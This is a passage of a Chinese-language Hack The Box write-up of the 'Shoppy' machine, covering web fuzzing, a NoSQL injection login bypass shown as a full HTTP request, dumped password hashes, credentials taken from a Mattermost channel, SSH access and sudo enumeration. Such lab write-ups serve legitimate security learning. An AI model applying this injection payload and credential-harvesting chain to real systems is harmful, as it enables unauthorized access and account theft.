class="hljs-number">301</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">173</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">7</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">11</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">130ms</span>]<br><span class="hljs-string">Login</span>                   [<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">1074</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">152</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">26</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">166ms</span>]<br><span class="hljs-string">js</span>                      [<span class="hljs-attr">Status:</span> <span class="hljs-number">301</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">171</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">7</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">11</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">197ms</span>]<br><span class="hljs-string">fonts</span>                   [<span class="hljs-attr">Status:</span> <span class="hljs-number">301</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">177</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">7</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">11</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">123ms</span>]<br><span class="hljs-string">Admin</span>                   [<span class="hljs-attr">Status:</span> <span class="hljs-number">302</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">28</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">4</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">1</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">127ms</span>]<br></code></pre></td></tr></table></figure>
+
+<p>7、这里发现了登录地址</p>
+<p><code>http://shoppy.htb/login</code></p>
+<p><img src="http://sh1yan.top/photo/Shoppy-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、这里其实存在 nosql 注入的地方的，但是我太菜了，用sqlmap也没跑出来</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login?error=WrongCredentials</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>shoppy.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>70<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://shoppy.htb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>rl_user_id=RudderEncrypt%3AU2FsdGVkX19GV6NK0DxKjkw9TOqmyNCFZmtg6KKCdZ5PoCh34YJOGx%2FVvfk4Tyvx; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX19vUyluZooqYBAoFRbSX0U9FcIWMKmUNuMmm0phmDD5HHeS3EsezVG4j3SmktVo0o9SKB1lNCe0bQ%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19Od9IT1QBGmBOxy16K0LIvkmWd6bLg0Yw%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX19N%2F9zK1I3qgOhRbSjBUI%2BmT1LXhV5YpN0%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2Btr%2FQPXf%2FEhg6ysL4ReI5quEwFjtvvdwQ%3D<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-pgsql">&#123;</span><br><span class="language-pgsql">    &quot;username&quot;: &quot;admin&#x27; || &#x27;a&#x27;==&#x27;a&quot;,</span><br><span class="language-pgsql">    &quot;password&quot;: &quot;password&quot;</span><br><span class="language-pgsql">&#125;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span> <span class="hljs-built_in">Found</span></span><br><span class="language-pgsql"><span class="hljs-keyword">Server</span>: nginx/<span class="hljs-number">1.23</span><span class="hljs-number">.1</span></span><br><span class="language-pgsql"><span class="hljs-type">Date</span>: Tue, <span class="hljs-number">24</span> Sep <span class="hljs-number">2024</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span>:<span class="hljs-number">41</span> GMT</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/html; charset=utf<span class="hljs-number">-8</span></span><br><span class="language-pgsql">Content-Length: <span class="hljs-number">56</span></span><br><span class="language-pgsql"><span class="hljs-keyword">Connection</span>: <span class="hljs-keyword">close</span></span><br><span class="language-pgsql"><span class="hljs-keyword">Location</span>: /<span class="hljs-keyword">admin</span></span><br><span class="language-pgsql">Vary: Accept</span><br><span class="language-pgsql"><span class="hljs-keyword">Set</span>-Cookie: <span class="hljs-keyword">connect</span>.sid=s%<span class="hljs-number">3</span>AKXaUxPPJpq4HpOPBRRbFctuxROj7xNBf.L9TZ3qOvAVSKH5kSzcMmNdksGSjis8WZU1kwNlJrCp8; <span class="hljs-type">Path</span>=/; HttpOnly</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;p&gt;<span class="hljs-built_in">Found</span>. Redirecting <span class="hljs-keyword">to</span> &lt;a href=&quot;/admin&quot;&gt;/<span class="hljs-keyword">admin</span>&lt;/a&gt;&lt;/p&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Shoppy-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、然后就绕过登录了，来到了后台界面了</p>
+<p><code>http://shoppy.htb/admin</code></p>
+<p><img src="http://sh1yan.top/photo/Shoppy-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>10、在搜索界面上随意输入绕过代码，发现可以下载文件</p>
+<p><code>http://shoppy.htb/admin/search-users?username=admin%27+%7C%7C+%27a%27%3D%3D%27a</code></p>
+<p><img src="http://sh1yan.top/photo/Shoppy-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>11、下面是下载的文件内容</p>
+<p><code>http://shoppy.htb/exports/export-search.json</code></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;62db0e93d6d6a999a66ee67a&quot;</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;23c6877d9e2b564ef8b32c3a23de27b2&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;62db0e93d6d6a999a66ee67b&quot;</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;josh&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;6ebcea65320589ca4f2f1ce039975995&quot;</span>&#125;]</span><br><br><span class="hljs-selector-attr">[&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;62db0e93d6d6a999a66ee67a&quot;</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;23c6877d9e2b564ef8b32c3a23de27b2&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;_id&quot;</span>:<span class="hljs-string">&quot;62db0e93d6d6a999a66ee67b&quot;</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;josh&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;6ebcea65320589ca4f2f1ce039975995&quot;</span>&#125;]</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Shoppy-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">josh<br><span class="hljs-number">6</span>ebcea65320589ca4f2f1ce<span class="hljs-number">039975995</span><br>remembermethisway<br></code></pre></td></tr></table></figure>
+
+<p>12、在这里我们获取了一些账号密码信息，然后就没进度了，其实到这里就是使劲的扫描子域名了</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs groovy">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ffuf -u <span class="hljs-attr">http:</span><span class="hljs-comment">//shoppy.htb -H &#x27;Host: FUZZ.shoppy.htb&#x27; -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  -fs 169 </span><br><br>        <span class="hljs-regexp">/&#x27;___\  /</span><span class="hljs-string">&#x27;___\           /&#x27;</span>___\       <br>       <span class="hljs-regexp">/\ \__/</span> <span class="hljs-regexp">/\ \__/</span>  __  __  <span class="hljs-regexp">/\ \__/</span>       <br>       \ \ ,__\\ \ ,__\<span class="hljs-regexp">/\ \/\ \ \ \ </span>,__\      <br>        \ \ \_<span class="hljs-regexp">/ \ \ \_/\ \ \_\ \ \ \ \_</span>/      <br>         \ \_\   \ \_\  \ \____/  \ \_\       <br>          \<span class="hljs-regexp">/_/</span>    \<span class="hljs-regexp">/_/</span>   \<span class="hljs-regexp">/___/</span>    \<span class="hljs-regexp">/_/</span>       <br><br>       v2<span class="hljs-number">.1</span><span class="hljs-number">.0</span>-dev<br>________________________________________________<br><br> :: <span class="hljs-attr">Method           :</span> GET<br> :: <span class="hljs-attr">URL              :</span> <span class="hljs-attr">http:</span><span class="hljs-comment">//shoppy.htb</span><br> :: <span class="hljs-attr">Wordlist         :</span> <span class="hljs-attr">FUZZ:</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>bitquark-subdomains-top100000.txt<br> :: <span class="hljs-attr">Header           :</span> <span class="hljs-attr">Host:</span> FUZZ.shoppy.htb<br> :: Follow <span class="hljs-attr">redirects :</span> <span class="hljs-literal">false</span><br> :: <span class="hljs-attr">Calibration      :</span> <span class="hljs-literal">false</span><br> :: <span class="hljs-attr">Timeout          :</span> <span class="hljs-number">10</span><br> :: <span class="hljs-attr">Threads          :</span> <span class="hljs-number">40</span><br> :: <span class="hljs-attr">Matcher          :</span> Response <span class="hljs-attr">status:</span> <span class="hljs-number">200</span><span class="hljs-number">-299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span><br> :: <span class="hljs-attr">Filter           :</span> Response <span class="hljs-attr">size:</span> <span class="hljs-number">169</span><br>________________________________________________<br><br>mattermost              [<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">3122</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">141</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">1</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-number">142</span>ms]<br></code></pre></td></tr></table></figure>
+
+<p>13、这一个步骤的子域名枚举，太坑了，我用了好几个字典都没有枚举出来想要的子域名，深度差评。</p>
+<p>14、本地绑定下hosts信息</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(kali㉿offsec)-<span class="hljs-string">[~/Desktop]</span><br>└─$ echo <span class="hljs-string">&quot;10.10.11.180 mattermost.shoppy.htb&quot;</span> | sudo tee -a /etc/hosts<br><span class="hljs-string">[sudo]</span> kali 的密码：<br><span class="hljs-number">10.10.11.180</span> mattermost.shoppy.htb<br></code></pre></td></tr></table></figure>
+
+<p>15、查看该子域名下的信息</p>
+<p><code>http://mattermost.shoppy.htb/login</code></p>
+<p><img src="http://sh1yan.top/photo/Shoppy-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://mattermost.shoppy.htb/reset_password</code></p>
+<p><img src="http://sh1yan.top/photo/Shoppy-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>16、这里使用上面破解出来的账号密码，登录了这个系统</p>
+<p><code>http://mattermost.shoppy.htb/shoppy/channels/town-square</code></p>
+<p><img src="http://sh1yan.top/photo/Shoppy-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>17、发现老板的账号</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@jaeger</span>  System Admin 系统管理员<br><span class="hljs-variable">@jess</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Shoppy-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>18、发现账号密码信息</p>
+<p><code>http://mattermost.shoppy.htb/shoppy/channels/deploy-machine</code></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">对于部署计算机，您可以使用以下 creds 创建一个帐户：<br>用户名：<span class="hljs-keyword">Jaeger</span><br><span class="hljs-keyword"></span>密码：<span class="hljs-keyword">Sh0ppyBest@pp!</span><br><span class="hljs-keyword"></span>并在其上部署。<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Shoppy-htb-writeup/12.png" srcset="/img/loading.gif" lazyload></p>
+<p>19、然后我们就开始使用发现的账号进行登录了。这里需要注意的是用户名的大小写，在linux机器中，对大小写很明显，所以这里一般都是需要小写的用户名的。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs llvm">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ssh jaeger<span class="hljs-title">@10</span>.<span class="hljs-number">10.11</span>.<span class="hljs-number">180</span><br>jaeger<span class="hljs-title">@10</span>.<span class="hljs-number">10.11</span>.<span class="hljs-number">180</span>&#x27;s password: <br>Linux shoppy <span class="hljs-number">5.10</span>.<span class="hljs-number">0</span><span class="hljs-number">-18</span>-amd<span class="hljs-number">64</span> <span class="hljs-variable">#1</span> SMP Debian <span class="hljs-number">5.10</span>.<span class="hljs-number">140</span><span class="hljs-number">-1</span> (<span class="hljs-number">2022</span><span class="hljs-number">-09</span><span class="hljs-number">-02</span>) <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span><br><br>The programs included with the Debian GNU/Linux system are <span class="hljs-keyword">free</span> software<span class="hljs-comment">;</span><br>the <span class="hljs-keyword">exact</span> distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY<span class="hljs-punctuation">,</span> <span class="hljs-keyword">to</span> the extent<br>permitted by applicable law.<br>jaeger<span class="hljs-title">@shoppy</span>:~$ id<br>uid<span class="hljs-operator">=</span><span class="hljs-number">1000</span>(jaeger) gid<span class="hljs-operator">=</span><span class="hljs-number">1000</span>(jaeger) groups<span class="hljs-operator">=</span><span class="hljs-number">1000</span>(jaeger)<br>jaeger<span class="hljs-title">@shoppy</span>:~$<br></code></pre></td></tr></table></figure>
+
+<p>20、然后获取到第一个用户的flag信息</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs tap">jaeger@shoppy:~$ ls -la<br>total 96<br>drwxr-xr-x<span class="hljs-number"> 19 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.<br>drwxr-xr-x <span class="hljs-number"> 4 </span>root   root  <span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>..<br>lrwxrwxrwx <span class="hljs-number"> 1 </span>jaeger jaeger   <span class="hljs-number"> 9 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.bash_history -&gt; /dev/null<br>-rw-r--r-- <span class="hljs-number"> 1 </span>jaeger jaeger <span class="hljs-number"> 220 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.bash_logout<br>-rw-r--r-- <span class="hljs-number"> 1 </span>jaeger jaeger<span class="hljs-number"> 3723 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.bashrc<br>drwx------<span class="hljs-number"> 14 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.cache<br>drwx------<span class="hljs-number"> 12 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.config<br>lrwxrwxrwx <span class="hljs-number"> 1 </span>jaeger jaeger   <span class="hljs-number"> 9 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.dbshell -&gt; /dev/null<br>drwxr-xr-x <span class="hljs-number"> 2 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>Desktop<br>drwxr-xr-x <span class="hljs-number"> 2 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>Documents<br>drwxr-xr-x <span class="hljs-number"> 2 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>Downloads<br>drwx------ <span class="hljs-number"> 3 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 23 </span><span class="hljs-number"> 2022 </span>.gnupg<br>drwxr-xr-x <span class="hljs-number"> 3 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.local<br>-rw------- <span class="hljs-number"> 1 </span>jaeger jaeger   <span class="hljs-number"> 0 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.mongorc.js<br>drwxr-xr-x <span class="hljs-number"> 2 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>Music<br>drwxr-xr-x <span class="hljs-number"> 4 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.npm<br>drwxr-xr-x <span class="hljs-number"> 5 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.nvm<br>drwxr-xr-x <span class="hljs-number"> 2 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>Pictures<br>drwxr-xr-x <span class="hljs-number"> 5 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 24 </span>01:59 .pm2<br>-rw-r--r-- <span class="hljs-number"> 1 </span>jaeger jaeger <span class="hljs-number"> 807 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.profile<br>drwxr-xr-x <span class="hljs-number"> 2 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>Public<br>drwxr-xr-x <span class="hljs-number"> 7 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 23 </span><span class="hljs-number"> 2022 </span>ShoppyApp<br>-rwxr--r-- <span class="hljs-number"> 1 </span>jaeger jaeger <span class="hljs-number"> 130 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>shoppy_start.sh<br>drwx------ <span class="hljs-number"> 2 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.ssh<br>drwxr-xr-x <span class="hljs-number"> 2 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>Templates<br>-rw-r----- <span class="hljs-number"> 1 </span>root   jaeger  <span class="hljs-number"> 33 </span>Sep<span class="hljs-number"> 24 </span>01:59 user.txt<br>drwxr-xr-x <span class="hljs-number"> 2 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>Videos<br>jaeger@shoppy:~$ ls -la ../<br>total 16<br>drwxr-xr-x <span class="hljs-number"> 4 </span>root   root  <span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.<br>drwxr-xr-x<span class="hljs-number"> 19 </span>root   root  <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 12 </span><span class="hljs-number"> 2022 </span>..<br>drwxr-xr-x <span class="hljs-number"> 3 </span>deploy deploy<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 23 </span><span class="hljs-number"> 2022 </span>deploy<br>drwxr-xr-x<span class="hljs-number"> 19 </span>jaeger jaeger<span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>jaeger<br>jaeger@shoppy:~$ ls -la ../deploy<br>total 52<br>drwxr-xr-x<span class="hljs-number"> 3 </span>deploy deploy <span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 23 </span><span class="hljs-number"> 2022 </span>.<br>drwxr-xr-x<span class="hljs-number"> 4 </span>root   root   <span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>..<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>deploy deploy    <span class="hljs-number"> 9 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.bash_history -&gt; /dev/null<br>-rw-r--r--<span class="hljs-number"> 1 </span>deploy deploy  <span class="hljs-number"> 220 </span>Mar<span class="hljs-number"> 27 </span><span class="hljs-number"> 2022 </span>.bash_logout<br>-rw-r--r--<span class="hljs-number"> 1 </span>deploy deploy <span class="hljs-number"> 3526 </span>Mar<span class="hljs-number"> 27 </span><span class="hljs-number"> 2022 </span>.bashrc<br>-rw-------<span class="hljs-number"> 1 </span>deploy deploy   <span class="hljs-number"> 56 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>creds.txt<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>deploy deploy    <span class="hljs-number"> 9 </span>Jul<span class="hljs-number"> 23 </span><span class="hljs-number"> 2022 </span>.dbshell -&gt; /dev/null<br>drwx------<span class="hljs-number"> 3 </span>deploy deploy <span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 23 </span><span class="hljs-number"> 2022 </span>.gnupg<br>-rwxr--r--<span class="hljs-number"> 1 </span>deploy deploy<span class="hljs-number"> 18440 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>password-manager<br>-rw-------<span class="hljs-number"> 1 </span>deploy deploy  <span class="hljs-number"> 739 </span>Feb <span class="hljs-number"> 1 </span><span class="hljs-number"> 2022 </span>password-manager.cpp<br>-rw-r--r--<span class="hljs-number"> 1 </span>deploy deploy  <span class="hljs-number"> 807 </span>Mar<span class="hljs-number"> 27 </span><span class="hljs-number"> 2022 </span>.profile<br>jaeger@shoppy:~$ <br>jaeger@shoppy:~$ cat user.txt <br>696b82cc1ca34fefee86a9fcc8341630<br>jaeger@shoppy:~$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>21、通过枚举，发现当前用户拥有其他用户的sudo权限</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs elixir">jaeger<span class="hljs-variable">@shoppy</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> <span class="hljs-symbol">jaeger:</span> <br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> jaeger on <span class="hljs-symbol">shoppy:</span><br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> jaeger may run the following commands on <span class="hljs-symbol">shoppy:</span><br>    (deploy) /home/deploy/password-manager<br><br><br>jaeger<span class="hljs-variable">@shoppy</span><span class="hljs-symbol">:~</span>$<br></code></pre></td></tr></table></figure>
+
+<p>22、尝试利用，发现并没有权限</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">jaeger<span class="hljs-variable">@shoppy</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -u deploy /home/deploy/password-manager<br><span class="hljs-title class_">Welcome</span> to <span class="hljs-title class_">Josh</span> password manager!<br><span class="hljs-title class_">Please</span> enter your master <span class="hljs-symbol">password:</span> <span class="hljs-title class_">Sh0ppyBest</span><span class="hljs-variable">@pp</span>!<br><span class="hljs-title class_">Access</span> denied! <span class="hljs-title class_">This</span> incident will be reported !<br>jaeger<span class="hljs-variable">@shoppy</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>
